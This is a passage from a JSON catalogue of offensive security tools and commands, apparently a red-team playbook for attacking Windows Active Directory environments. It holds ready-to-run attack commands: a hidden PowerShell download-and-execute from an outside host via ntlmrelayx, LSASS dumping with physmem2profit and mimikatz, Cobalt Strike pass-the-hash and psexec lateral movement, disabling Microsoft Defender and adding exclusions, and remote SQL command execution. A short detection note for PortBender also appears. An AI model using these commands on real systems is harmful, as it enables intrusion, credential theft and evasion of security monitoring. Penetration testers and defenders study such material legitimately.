--script=s7-info,modbus-discover,bacnet-info,enip-info,Siemens-CommunicationsProcessor.nse,Siemens-HMI-miniweb.nse,Siemens-Scalance-module.nse,Siemens-SIMATIC-PLC-S7.nse,Siemens-WINCC.nse 172.29.137.100\n\n## [[SMB Signing]]\n> nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK\n\n## [[User enum]]\n> nmap -n -sV --script \"ldap* an not brute\" -p 389 <dc-ip>\n\n## [[Exposed Machines]] [[Domain Computers]]\n* Ping Scan  \n> nmap -sP -p <ip>\n* Search smb vuln  \n> nmap -PN --script smb-vuln* -p139,445 <ip>\n* Classic Scan  \n> nmap -PN -sC -sV <ip>\n* Full Scan  \n>nmap -PN -sC -sV -p- <ip>\n* UDP Scan  \n>nmap -sU -sC -sV <ip>\n\n## [[SOCKS Proxy]]\nNmap example via proxychains:\n``````sh\nproxychains nmap -n -Pn -sT -p445,3389,5985 10.10.1.20\n``````\n\u26a0\ufe0fICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for this to work\n\n",
    "commands": [
      {
        "id": "48485f28-a541-4bff-9d0b-f73bef3c57ae",
        "name": "Find Shares",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:SHARES"
        ],
        "cmd": ".\\nmap.exe -T4 script=smb-enum-shares <ip>"
      }
    ]
  },
  {
    "name": "nmcli",
    "phases": [
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Domain Controller]]\nShow domain name & dns  \n`nmcli edu show eth0`\n\n\n",
    "commands": []
  },
  {
    "name": "Nslookup",
    "phases": [
      "02. Reconnaissance",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/nslookup",
    "description": "Nameserver lookups on the network",
    "undetected": [],
    "detected": [],
    "content": "## [[Domain Controller]]\nShow Domain  \n* 'nslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/'\n* 'nslookup -type=SRV _kerberos._tcp.dc._msdcs.<searchdomain>'\n* 'nslookup -type=A gc._msdcs.<DNSForestName>'\n* 'nslookup -type=SRV _ldap._tcp.pdc._msdcs.<searchdomain>'\n* 'nslookup -type=SRV _ldap._tcp.gc._msdcs.<searchdomain>'\n* 'nslookup -type=A <DC_FQDN>'\n\n## [[Find Mail Server]]\nFind exchange server via nslookup  \n'nslookup -q=MX <domain>'\n'nslookup _tcp._autodiscover.domain.com'  \n'nslookup autodiscover.domain.com'  \n'nslookup mail.domain.com'  \n'nslookup email.domain.com'  \n'nslookup owa.domain.com'  \n'nslookup securemail.domain.com'  \n\n\n",
    "commands": [
      {
        "id": "c1460e95-3d40-4186-8abe-0d2131fea55e",
        "name": "Show Domain",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:DC"
        ],
        "cmd": "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN\nnslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/\nnslookup -type=SRV _kerberos._tcp.dc._msdcs.<searchdomain>\nnslookup -type=A gc._msdcs.<DNSForestName>\nnslookup -type=SRV _ldap._tcp.pdc._msdcs.<searchdomain>\nnslookup -type=SRV _ldap._tcp.gc._msdcs.<searchdomain>\nnslookup -type=A <DC_FQDN>"
      },
      {
        "id": "b4edfce8-8bb0-421c-a907-478f66c74d03",
        "name": "Find Exchange Server",
        "description": "",
        "tag": "",
        "results": [
          "SERVER:EXCHANGE"
        ],
        "cmd": "nslookup -q=MX <domain>\nnslookup _tcp._autodiscover.domain.com\nnslookup autodiscover.domain.com\nnslookup mail.domain.com\nnslookup email.domain.com\nnslookup owa.domain.com\nnslookup securemail.domain.com"
      }
    ]
  },
  {
    "name": "ntlmrelayx",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx",
    "description": "NTLM relay tool",
    "undetected": [],
    "detected": [],
    "content": "## [[NTLM Relaying]]\nRun ntlmrelayx or responder.\nBy default (not provided -c) it will do `secretsdump` to dump the local SAM hashes\n``````sh\nproxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server\n\n# alternatively provide a command with:\n-c\n'powershell -nop -w hidden -c \"iex (new-object net.webclient).downloadstring(\\\"http://10.10.17.231:8080/b\\\")\"'\n``````\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T15:04:47Z"
  },
  {
    "name": "physmem2profit",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/FSecureLABS/physmem2profit",
    "description": "Used to create a minidump of a target hosts' LSASS process by analysing physical memory remotely",
    "undetected": [],
    "detected": [],
    "content": "\n## Installation\n1. Clone the Physmem2profit Git repository:\n> git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git\n2. For the server running on the target computer: Build physmem2profit/server/Physmem2profit.sln with Visual Studio\n3. For the client running on the attacking machine:\n> bash physmem2profit/client/install.sh\n\n## [[LSASS dumping]]\n1. Run on the target as admin\n> physmem2profit.exe [--ip IP] [-p PORT] [--hidden] [--verbose]\n2. You can download the signed Winpmem driver [here](https://github.com/Velocidex/WinPmem/raw/master/kernel/binaries/winpmem_x64.sys). This driver needs to be present on the target host.\n3. Run on the attacking machine. This command will activate the virtualenv created by install.sh.\n> source physmem2profit/client/.env/bin/activate \n4. Run on the attacking machine\n> cd physmem2profit/client and python3 physmem2profit --host HOST [--port PORT] [--mode MODE] [--driver DRIVER ] [--instal DRIVER_PATH_ON_TARGET] [--label LABEL_FOR_MEMORY_DUMP]\n- physmem2profit.exe needs to be running on the target machine before you run this command.\n- This will write the LSASS minidump to output/[label]-[date]-lsass.dmp on the attacking machine.\n5. Copy the minidump to a Windows system and run mimikatz\n> mimikatz.exe \"sekurlsa::minidump [label]-[date]-lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\"\n\n\n",
    "commands": [],
    "latest_commit": "2022-07-27T03:33:59Z"
  },
  {
    "name": "PortBender",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/praetorian-inc/PortBender",
    "description": "TCP Port Redirection Utility for Cobalt Strike",
    "undetected": [],
    "detected": [],
    "content": "\n## Command\n``````beacon\nbeacon> help PortBender\nRedirect Usage: PortBender redirect FakeDstPort RedirectedPort\nBackdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password\nExamples:\n PortBender redirect 445 8445\n PortBender backdoor 443 3389 praetorian.antihacker\n\nbeacon> PortBender redirect 445 8445\n[+] Launching PortBender module using reflective DLL injection\nInitializing PortBender in redirector mode\nConfiguring redirection of connections targeting 445/TCP to 8445/TCP\n``````\n\n## Detection\nOne of the main indicators of this activity is the driver load event for WinDivert.  You can find driver loads in Kibana using Sysmon Event ID 6.  Even though the WinDivert driver has a valid signature, seeing a unique driver load on only one machine is an anomalous event.\n\n>event.module: sysmon and event.code: 6 and not file.code_signature.subject_name: \"Amazon Web Services, Inc.\"\n\nAs hinted above, the PortBender CNA uses the [bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn) function to spawn a new process and inject the reflective DLL into.  By default, this is rundll32 and will be logged under Sysmon Event ID 1.\n\n## [[NTLM Relaying]]\n1. Upload WinDiver64.sys driver to `C:\\Windows\\system32\\drivers`\n2. Redirecting SMB to 8445\n3. Create a pfwd to relay 8845 to the C2 server with [[ntlmrelayx]] running\n4. Start a socks4 on 1080 so SMB can go through\n5. NTLM relay the smb connection to dump local SAM hashes\n6. Use via [[Pass-the-Hash]] or crack via [[Hashcat]]\n\nLoad `PortBender.cna`\n``````beacon\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> pwd\n[*] Current directory is C:\\Windows\\system32\\drivers\n\nbeacon> upload C:\\Tools\\PortBender\\WinDivert64.sys\nbeacon> PortBender redirect 445 8445\nbeacon> rportfwd 8445 127.0.0.1 445\n[+] started reverse port forward on 8445 to 127.0.0.1:445\n\nbeacon> socks 1080\n[+] started SOCKS4a server on: 1080\n\nproxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server\n``````\n\nLocal NTLM hashes could then be cracked or used with [[Pass-the-Hash]].\n``````beacon\nbeacon> mimikatz sekurlsa::pth /user:Administrator /domain:edu.evil.corp /ntlm:b423cdd3ad21718de4490d9344afef72\nbeacon> steal_token 21244\nbeacon> jump psexec64 srv2 smb\n[*] Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_a3) on srv2 via Service Control Manager (\\\\srv2\\ADMIN$\\1985e43.exe)\nStarted service 3695e43 on srv2\n[+] established link to child beacon: 10.10.17.68\n``````\n\n",
    "commands": [],
    "latest_commit": "2023-01-31T09:44:16Z"
  },
  {
    "name": "Powermad",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/Kevin-Robertson/Powermad",
    "description": "PowerShell MachineAccountQuota and DNS exploit tools",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Resource Based Constrained Delegation (RBCD)]]\nAdd a new machine account\n> New-MachineAccount -MachineAccount test\n\nUse the added account with runas /netonly\n> runas /netonly /user:domain\\test$ powershell\n\nSet the `msDS-AllowedToActOnBehalfOfOtherIdentity` to the current machine\n> Set-MachineAccountAttribute -MachineName dc-1 -Attribute msDS-AllowedToActOnBehalfOfOtherIdentity -Value test-securitydesciptor\n\n",
    "commands": [],
    "latest_commit": "2023-01-11T00:48:35Z"
  },
  {
    "name": "PowerShell",
    "phases": [
      "01. Initial Access",
      "03. Host Enumeration",
      "04. Persistence",
      "05. Privilege Escalation",
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/de-de/powershell/?view=powershell-7.3",
    "description": "PowerShell",
    "undetected": [],
    "detected": [],
    "content": "\n\n## [[LSA Protection]]\n`Get-WinEvent -FilterHashtable @{ LogName='system'; Id='12' ; ProviderName='Microsoft-Windows-Wininit' }`\n\n## [[RDP]]\n`Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational'; id='1024' } | select timecreated, message | ft -AutoSize -Wrap`\n\n## [[COM Hijacking]]\nList COM objects\n`gwmi Win32_COMSetting | ? {$_.progid } | sort | ft ProgId,Caption,InprocServer32`\n\nList COM Object Methods for WScript.Shell.1\n`$o = [activator]::CreateInstance([type]::GetTypeFromProgID((\"WScript.Shell.1\"))) | gm`\n\n## [[Unquoted Service Path]]\nGet ACLs of services\n```ps\npowershell Get-Acl -Path \"C:\\Program Files\\Vuln Services\" | fl\n  \nPath   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\Vuln Services\nOwner  : BUILTIN\\Administrators\nGroup  : wkstn1\\None\nAccess : CREATOR OWNER Allow  FullControl\n NT AUTHORITY\\SYSTEM Allow  FullControl\n BUILTIN\\Administrators Allow  FullControl\n BUILTIN\\Users Allow  Write, ReadAndExecute, Synchronize\n NT SERVICE\\TrustedInstaller Allow  FullControl\n APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n```\n\n## [[Common Language Runtime (CLR) Versions]]\n```ps\ndir %WINDIR%\\Microsoft.Net\\Framework\\ /s /b | find \"System.dll\"\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll\")\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v4.0.30319 System.dll\")\n```\n\n",
    "commands": [
      {
        "id": "6183749c-eee5-42ca-a171-ac1b1a35a449",
        "name": "Check LSA Protection",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-WinEvent -FilterHashtable @{ LogName='system'; Id='12' ; ProviderName='Microsoft-Windows-Wininit' }"
      },
      {
        "id": "a8516fd7-ce4f-4c19-97c9-780aa299f594",
        "name": "Disable Defender",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableScriptScanning $true\nSet-MpPreference -DisableArchiveScanning $true",
        "requirements": {
          "tag": "PRIVS:ADMIN"
        }
      },
      {
        "id": "48b78655-db1f-4da0-9d31-f90cc810eb3e",
        "name": "Get ACLs of services",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "powershell Get-Acl -Path \"C:\\Program Files\\Vuln Services\" | fl"
      },
      {
        "id": "bf3b2a29-c697-4835-aadd-02cf9a14dcbc",
        "name": "Get all COM objects via wmi",
        "description": "A lot of output",
        "tag": "",
        "results": [],
        "cmd": "gwmi Win32_COMSetting | ? {$_.progid } | sort | ft ProgId,Caption,InprocServer32"
      },
      {
        "id": "5c9766c7-293d-4110-bfeb-0aabfd061080",
        "name": "Get CLR versions",
        "description": "Get Common Language Runtime (CLR) versions",
        "tag": "",
        "results": [],
        "cmd": "cmd.exe /c dir %WINDIR%\\Microsoft.Net\\Framework\\ /s /b | find \"System.dll\"\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll\")\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v4.0.30319 System.dll\")"
      },
      {
        "id": "52121667-91db-4042-910a-ae02121b82f3",
        "name": "Get Defender Detections",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-MpThreatDetection"
      },
      {
        "id": "c6a72c8f-0734-4a95-9dfd-241ac41591b5",
        "name": "Get Defender Exclusions",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
        "requirements": {
          "tag": "PRIVS:ADMIN"
        }
      },
      {
        "id": "4e5c3ef8-0775-4d8e-af57-a82dc066e524",
        "name": "Get Defender Status",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-MpComputerStatus\nGet-MpPreference"
      },
      {
        "id": "3c5b88d5-05d2-43bd-912a-d7025e4751f0",
        "name": "Get Imported Modules",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-Module -All"
      },
      {
        "id": "94a5526d-cdc0-47e9-afd7-a14881beffe1",
        "name": "Get latest MDE Detection",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-MpThreatDetection |sort $_.InitialDetectionTime |select -First 1"
      },
      {
        "id": "e6685b82-4fa3-4591-bc80-732a64a8cc28",
        "name": "Get methods of COM object ",
        "description": "List COM Object Methods for WScript.Shell.1",
        "tag": "",
        "results": [],
        "cmd": "[activator]::CreateInstance([type]::GetTypeFromProgID((\"WScript.Shell.1\"))) | gm"
      },
      {
        "id": "36c7d31c-865d-4e71-83fe-cd41b3560f42",
        "name": "Get MSSQL Servers",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "ADForestInfoRootDomain = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).RootDomain\n$ADForestInfoRootDomainDN = \"DC=\" + $ADForestInfoRootDomain -Replace(\"\\.\",',DC=')\n$ADDomainInfoLGCDN = 'GC://' + $ADForestInfoRootDomainDN\n$root = [ADSI]$ADDomainInfoLGCDN\n$ADSPNSearcher = new-Object System.DirectoryServices.DirectorySearcher($root,\"(serviceprincipalname=*sql*)\")\n$ADSPNSearcher.PageSize = 500\n$AllADSQLServerSPNs = $ADSPNSearcher.FindAll()"
      },
      {
        "id": "cc43d2fa-b951-4f09-b37f-91f34ea5bbaf",
        "name": "Get RDP Events",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational'; id='1024' } | select timecreated, message | ft -AutoSize -Wrap"
      },
      {
        "id": "cfdc1559-6498-40c2-8bbe-e200e7a47ec1",
        "name": "Get Registry Entry",
        "description": "With the example of AppLocker and WDAC",
        "tag": "",
        "results": [],
        "cmd": "#APPLOCKER\nGet-ChildItem -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\SRPV2'\nGet-ChildItem -Path 'HKLM:\\System\\CurrentControlSet\\Control\\SRP\\GP'\nGet-ChildItem -Path \n#WDAC\n'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard -v DeployConfigCIPolicy'\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard -v ConfigCIPolicyFilePath'"
      },
      {
        "id": "7dc8490f-8454-4d39-83d5-43bcda1bc27c",
        "name": "Launch C# via PowerShell",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "$id = get-random\n$assemblies = (\"System.Core\",\"System.Xml.Linq\",\"System.Data\",\"System.Xml\", \"System.Data.DataSetExtensions\", \"Microsoft.CSharp\")\nAdd-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp\n$code = @\"\nusing System;\nnamespace HelloWorld\n{\n\tpublic class Program$id\n\t{\n\t\tpublic static void Main(){\n\t\t\tConsole.WriteLine(\"Hello world!\");\n\t\t}\n\t}\n}\n\"@\n \nAdd-Type -TypeDefinition $code -Language CSharp\t\niex \"[HelloWorld.Program$id]::Main()\""
      },
      {
        "id": "7e1ff5f3-6e68-405c-81b5-64bba180e491",
        "name": "Load Github Script Remotely",
        "description": "Showed with an example of PowerView",
        "tag": "",
        "results": [],
        "cmd": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Find-GPOLocation -UserName Administrator;"
      },
      {
        "id": "91dc7ca7-51e5-414f-a6c7-37094cfa60e5",
        "name": "PS-Remoting",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Invoke-Command -ComputerName Test1-Win2k16 -ScriptBlock{Get-LocalGroupMember -Name 'Administrators'}",
        "requirements": {
          "tag": "SERVICE:WINRM"
        }
      },
      {
        "id": "0b63dd81-e89a-4934-b625-4ab767e81149",
        "name": "Trigger WSUS",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "$updateSession = New-Object -com \"Microsoft.Update.Session\"; $updates=$updateSession.CreateupdateSearcher().Search($criteria).Updates; wuauclt.exe /reportnow"
      },
      {
        "id": "eb9dc6fa-f509-41ab-ab5c-33653b431bc4",
        "name": "Set Defender Exclusions",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Set-MpPreference -ExclusionPath PATH\\TO\\FOLDER\nSet-MpPreference -ExclusionExtension docx\nSet-MpPreference -ExclusionProcess Process",
        "requirements": {
          "tag": "PRIVS:ADMIN"
        }
      }
    ]
  },
  {
    "name": "PowerUp",
    "phases": [
      "05. Privilege Escalation",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/NetSPI/PowerUp",
    "description": "Exploitation Tools",
    "undetected": [],
    "detected": [],
    "content": "\n\n\n\n",
    "commands": [],
    "latest_commit": null
  },
  {
    "name": "PowerUpSQL",
    "phases": [
      "02. Reconnaissance",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/NetSPI/PowerUpSQL",
    "description": "SQL Exploitation Tools",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [
      {
        "id": "c225c0b5-0f0d-4c88-b72e-a2f39022f885",
        "name": "Get SQL-Server via SPN",
        "description": "Searching for SPNs that begin with MSSQL*",
        "tag": "",
        "results": [
          "SERVICE:SQL"
        ],
        "cmd": "Get-SQLInstanceDomain\n\nComputerName     : srv1.edu.evil.corp\nInstance         : srv1.edu.evil.corp,1433\nDomainAccountSid : 150000[ ...snip... ]172110400\nDomainAccount    : svc_mssql\nDomainAccountCn  : MS SQL Service\nService          : MSSQLSvc\nSpn              : MSSQLSvc/srv1.edu.evil.corp:1433\nLastLogon        : 5/14/2022 2:24 PM\nDescription      :"
      },
      {
        "id": "498e5c7a-71be-4547-944e-741622d795e1",
        "name": "Get SQL-Server via Broadcast",
        "description": "",
        "tag": "",
        "results": [
          "SERVICE:SQL"
        ],
        "cmd": "Get-SQLInstanceBroadcast"
      },
      {
        "id": "c78f6db7-b5d7-492c-8a29-93b220195862",
        "name": "Get SQL-Server via UDP scan",
        "description": "",
        "tag": "",
        "results": [
          "SERVICE:SQL"
        ],
        "cmd": "Get-SQLInstanceScanUDP"
      },
      {
        "id": "1178765f-8d1e-49b8-9354-8d67e1d7cfa7",
        "name": "Get SQL-Server Information",
        "description": "",
        "tag": "",
        "results": [
          "SERVICE:SQL:INFO"
        ],
        "cmd": "Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo\n",
        "requirements": {
          "tag": "SERVICE:SQL"
        }
      },
      {
        "id": "b2b091f4-3ef8-45a4-880a-1c76f39ee0e2",
        "name": "Test login",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "Get-SQLConnectionTest -Instance \"srv1.edu.evil.corp,1433\" | fl\n\nComputerName : srv1.edu.evil.corp\nInstance     : srv1.edu.evil.corp,1433\nStatus       : Accessible",
        "requirements": {
          "tag": "SERVICE:SQL"
        }
      },
      {
        "id": "2dd747b0-646a-4ccc-9418-7e613e0dd947",
        "name": "Get SQL-Server information",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-SQLServerInfo -Instance \"srv1.edu.evil.corp,1433\"\n\nComputerName           : srv1.edu.evil.corp\nInstance               : SRV1\nDomainName             : EDU\nServiceProcessID       : 3960\nServiceName            : MSSQLSERVER\nServiceAccount         : EDU\\svc_mssql\nAuthenticationMode     : Windows Authentication\nForcedEncryption       : 0\nClustered              : No\nSQLServerVersionNumber : 13.0.5026.0\nSQLServerMajorVersion  : 2019\nSQLServerEdition       : Standard Edition (64-bit)\nSQLServerServicePack   : SP2\nOSArchitecture         : X64\nOsMachineType          : ServerNT\nOSVersionName          : Windows Server 2016 Datacenter\nOsVersionNumber        : SQL\nCurrentlogin           : EDU\\john\nIsSysadmin             : Yes\nActiveSessions         : 1",
        "requirements": {
          "tag": "SERVICE:SQL"
        }
      },
      {
        "id": "7f54233d-02a5-4f22-9451-f74ee2824a69",
        "name": "Query SQL",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select @@servername\"\n\nColumn1\n-------\nSRV1",
        "requirements": {
          "tag": "SERVICE:SQL"
        }
      },
      {
        "id": "1c9e311e-e639-43fd-8baa-8fe14ad50ca3",
        "name": "SQL Command Execution",
        "description": "",
        "tag": "",
        "results": [
          "EXECUTION:REMOTE"
        ],
        "cmd": "Invoke-SQLOSCmd -Instance \"srv1.edu.evil.corp,1433\" -Command \"whoami\" -RawResults\n\nedu\\svc_mssql",
        "requirements": {
          "tag": "SERVICE:SQL"
        }
      },
      {
        "id": "86910ee4-5915-4035-bef3-7d866b6ba9d4",
        "name": "Get SQL-Server Link",
        "description": "Manually querying databases to find links can be cumbersome and time-consuming, so you can also use Get-SQLServerLinkCrawl to automatically crawl all available links.",
        "tag": "",
        "results": [
          "SERVICE:SQL:LINK"
        ],
        "cmd": "Get-SQLServerLinkCrawl -Instance \"srv1.edu.evil.corp,1433\"\n\nVersion     : SQL Server 2016 \nInstance    : SRV1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1}\nUser        : EDU\\john\nLinks       : {SQL-1.EVIL.CORP}\n\nVersion     : SQL Server 2016 \nInstance    : SQL-1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP}\nUser        : sa\nLinks       : {SQL01.evil.external}\n\nVersion     : SQL Server 2019 \nInstance    : SQL01\\SQLEXPRESS\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP, SQL01.evil.external}\nUser        : sa\nLinks       :",
        "requirements": {
          "tag": "SERVICE:SQL"
        }
      }
    ],
    "latest_commit": "2022-12-26T22:59:48Z"
  },
  {
    "name": "PowerView",
    "phases": [
      "02. Reconnaissance",
      "03. Host Enumeration",
      "05. Privilege Escalation",
      "06. Domain Enumeration",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
    "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains.",
    "undetected": [],
    "detected": [],
    "content": "# PowerView\n\n```powershell\npowershell-import C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1\n\nor\n\nipmo C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1\n```\n\n## Commands\n\n| Function | Description |\n| -------- | ----------- |\n| Get-Domain | domain name, the forest name and the domain controllers |\n| Get-DomainController \\| select Forest, Name, OSVersion \\| fl | dc dns, forest, OSVersion |\n| Get-ForestDomain | all domains for the current forest |\n| Get-DomainPolicyData \\| select -ExpandProperty SystemAccess | password policy |\n| Get-DomainUser -Identity patrick -Properties DisplayName, MemberOf \\| fl | Get user (! -IDENTITY IS IMPORTANT OR IT WILL DUMP EVERYTHING) |\n| Get-DomainComputer -Properties DnsHostName \\| sort -Property DnsHostName | All domain computers |\n| Get-DomainOU -Properties Name \\| sort -Property Name | All OUs |\n| Get-DomainGroup \\| where Name -like \"*Admins*\" \\| select SamAccountName | Get all groups filtered |\n| Get-DomainGroupMember -Identity \"Domain Admins\" \\| select MemberDistinguishedName | Get all members of a group |\n| Get-DomainGPO -Properties DisplayName \\| sort -Property DisplayName | Get all GPOs |\n| Get-DomainGPO -ComputerIdentity wkstn1 -Properties DisplayName \\| sort -Property DisplayName | Get all GPOs of a machine |\n| Get-DomainGPOLocalGroup \\| select GPODisplayName, GroupName | GPOs that modify local group memberships (restricted groups) |\n| Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators \\| select ObjectName, GPODisplayName, ContainerName, ComputerName | Get machines where a specific domain user/group is a member of a specific local group |\n| Find-DomainUserLocation \\| select UserName, SessionFromName | Enum all machines for users/groups where those users are logged into \u26a0\ufe0f#OPSEC LOUD |\n| Get-NetSession -ComputerName dc-2 \\| select CName, UserName | Session information for the local/remote machine |\n| Get-DomainTrust | Get all domain trusts for current or specified domain |\n\n## Default Functions\n\n## [[Domain]]\n\n### Get-Domain\n\n```powershell\nGet-Domain\n\nForest                  : evil.corp\nDomainControllers       : {dc-2.edu.evil.corp}\nChildren                : {}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : evil.corp\nPdcRoleOwner            : dc-2.edu.evil.corp\nRidRoleOwner            : dc-2.edu.evil.corp\nInfrastructureRoleOwner : dc-2.edu.evil.corp\nName                    : edu.evil.corp\n```\n\n### Get-DomainPolicyData\n\n```powershell\nGet-DomainPolicyData | select -ExpandProperty SystemAccess\n\nMinimumPasswordAge           : 1\nMaximumPasswordAge           : 42\nMinimumPasswordLength        : 7\nPasswordComplexity           : 1\nPasswordHistorySize          : 24\nLockoutBadCount              : 0\nRequireLogonToChangePassword : 0\nForceLogoffWhenHourExpire    : 0\nClearTextPassword            : 0\nLSAAnonymousNameLookup       : 0\n```\n\n### Get-DomainSID\n\n```powershell\nGet-DomainSID\n```\n\n### Get SID of Group\n\n```powershell\nGet-DomainGroup -Identity \"Domain Admins\" -Domain evil.corp -Properties ObjectSid\n\nobjectsid                                   \n---------                                   \nS-1-5-21-378720957-2217973887-3501892633-512\n```\n\n### Convert SID\n\n```powershell\nConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n## [[Domain Controller]]\n\n### Get DC\n\n```powershell\nGet-DomainController | select Forest, Name, OSVersion | fl\n\nForest    : evil.corp\nName      : dc-2.edu.evil.corp\nOSVersion : Windows Server 2016 Datacenter\n```\n\n```powershell\nGet-DomainController -Domain evil.corp | select Name\n\nName              \n----              \ndc-1.evil.corp\n```\n\n### Get DC via Trust\n\n```powershell\nGet-DomainComputer -Domain evil.external -Properties DNSHostName\n\ndnshostname           \n-----------           \nad.evil2.corp\n```\n\n## [[Domain Forest]]\n\n### Get-ForestDomain\n\n```powershell\nGet-ForestDomain\n\nForest                  : evil.corp\nDomainControllers       : {dc-1.evil.corp}\nChildren                : {edu.evil.corp}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : \nPdcRoleOwner            : dc-1.evil.corp\nRidRoleOwner            : dc-1.evil.corp\nInfrastructureRoleOwner : dc-1.evil.corp\nName                    : evil.corp\n\nForest                  : evil.corp\nDomainControllers       : {dc-2.edu.evil.corp}\nChildren                : {}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : evil.corp\nPdcRoleOwner            : dc-2.edu.evil.corp\nRidRoleOwner            : dc-2.edu.evil.corp\nInfrastructureRoleOwner : dc-2.edu.evil.corp\nName                    : edu.evil.corp\n```\n\n## [[Domain GPOs]] [[Local Administrator Password Solution (LAPS)]]\n\n### Get GPOs filter with name\n\n```powershell\nGet-DomainGPO | ? { $_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | 